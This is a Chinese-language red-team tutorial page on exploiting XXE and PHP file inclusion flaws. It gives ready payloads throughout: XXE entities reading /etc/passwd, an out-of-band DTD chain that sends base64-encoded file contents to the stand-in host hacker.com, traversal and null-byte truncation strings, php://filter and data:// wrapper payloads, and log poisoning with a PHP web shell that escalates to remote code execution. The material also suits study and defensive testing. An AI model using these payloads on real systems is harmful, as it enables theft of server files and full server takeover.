---
title: "XXE与文件包含漏洞深度利用"
weight: 50
---

# XXE与文件包含漏洞深度利用

在渗透测试的 Web 攻击面中，**XXE（XML 外部实体注入）** 和 **文件包含（File Inclusion, LFI/RFI）** 虽然成因不同，但在实战利用中往往殊途同归——它们都常被用于读取服务器敏感文件、探测内网，甚至升级为 RCE（远程代码执行）。

本文将从漏洞利用的底层逻辑出发，深度剖析这两种漏洞的进阶利用手法与协议链构造。

---

## 1. XXE (XML 外部实体注入) 利用技术

当应用解析 XML 输入时，如果未禁用外部实体的加载，攻击者就可以构造恶意的 DTD（文档类型定义），迫使解析器去读取本地文件或发起网络请求。

### 1.1 常规读取与 SSRF 探测
基础的 XXE 利用非常直观，利用 `SYSTEM` 关键字即可读取文件或发起 HTTP 请求：
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE evil [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <!ENTITY ssrf SYSTEM "http://192.168.1.1:8080">
]>
<root>&xxe;</root>
```

### 1.2 OOB XXE (带外盲打)
在真实的实战场景中，大多数 XXE 是**无回显（Blind）**的。我们需要通过带外通信（Out-of-Band）将读取到的数据外传。
**利用原理**：通过参数实体（Parameter Entities `%`）在 DTD 内部动态拼接数据。
1.  构造恶意的本地 Payload，让目标去请求黑客的远程 DTD 文件。
    ```xml
    <!DOCTYPE root [
      <!ENTITY % remote SYSTEM "http://hacker.com/evil.dtd">
      %remote;
      %send;
    ]>
    ```
2.  黑客的 `evil.dtd` 构造如下逻辑：
    ```xml
    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://hacker.com/?data=%file;'>">
    %eval;
    ```
3.  **解析流程**：目标读取 `/etc/passwd` -> Base64编码 -> 拼接到 URL -> 发起 HTTP GET 请求，黑客即可在 Web 日志中获取被读取的文件内容。

---

## 2. 文件包含漏洞 (LFI/RFI) 利用技术

文件包含漏洞多见于 PHP（`include`, `require`），由于开发者未对传入的文件路径进行过滤，导致攻击者可以包含并执行任意代码。

### 2.1 目录穿越与截断
*   **基础穿越**：`?file=../../../../etc/passwd`
*   **%00 空字节截断**（PHP < 5.3.4）：如果后端代码为 `include($file . ".html");`，传入 `?file=../../../../etc/passwd%00` 即可截断后面的 `.html`。
*   **路径长度截断**：Windows 下路径最长 256 字节，Linux 为 4096 字节。传入极其冗长的 `./././...` 导致后缀被截断抛弃。

### 2.2 PHP 伪协议链利用 (重点)
伪协议（Pseudo-Protocols）是 PHP 文件包含的灵魂。
*   **php://filter (读取源码)**：直接包含 PHP 文件会被解析执行，无法看到源码。通过 Base64 过滤器可以将其作为纯文本读取：
    `?file=php://filter/read=convert.base64-encode/resource=config.php`
*   **php://input (代码执行)**：如果 `allow_url_include` 开启，可通过 POST 请求体直接发送 PHP 代码进行包含执行。
*   **data:// (代码执行)**：同样需要 `allow_url_include`，直接在 URL 中编码 Payload：
    `?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+`

---

## 3. LFI to RCE: 从文件包含到命令执行的进阶之路

如果在渗透中发现了一个 LFI 漏洞，但目标无法上传文件，也没有开启远程包含（RFI），如何将其转化为 RCE？

### 3.1 日志污染 (Log Poisoning)
Web 服务器或 SSH 服务会将用户的访问记录写入日志。
**利用链**：
1.  使用 Burp Suite 修改 User-Agent 为恶意的 PHP 代码：`<?php system($_GET['cmd']); ?>`。
2.  发送请求，该代码会被原样写入 Apache/Nginx 的 `access.log` 或 `/var/log/auth.log`。
3.  利用 LFI 漏洞包含该日志文件：`?file=/var/log/apache2/access.log&cmd=id`。日志被包含时，其中的 PHP 代码被激活执行。

### 3.2 包含 Session 文件
PHP 的 Session 通常以 `sess_<PHPSESSID>` 的形式存储在 `/tmp/` 目录下。
如果目标网站有修改 Session 值（如修改昵称）的功能，可以将恶意的 PHP 代码写入 Session 中，随后利用 LFI 包含该 Session 文件触发 RCE。

### 3.3 临时文件包含与条件竞争
当向 PHP 发送 POST 请求并带有文件时，PHP 会先将文件暂存在 `/tmp/phpXXXXXX`。
**利用链**：利用条件竞争（Race Condition），在 PHP 脚本处理完毕并删除该临时文件之前，利用高并发的 LFI 请求去强行包含这个临时文件，从而执行里面的恶意代码。

---

## 4. 总结

无论是通过 XXE 构造 DTD 链条进行内网数据榨取，还是利用 LFI 结合日志污染实现 RCE，其本质都是利用了底层解析引擎的特性与服务器配置的缺陷。在红队实战中，熟练运用协议链（如 `php://filter`）与带外外发机制（OOB），往往能让原本局限在文件层面的漏洞，爆发出接管整个服务器的威力。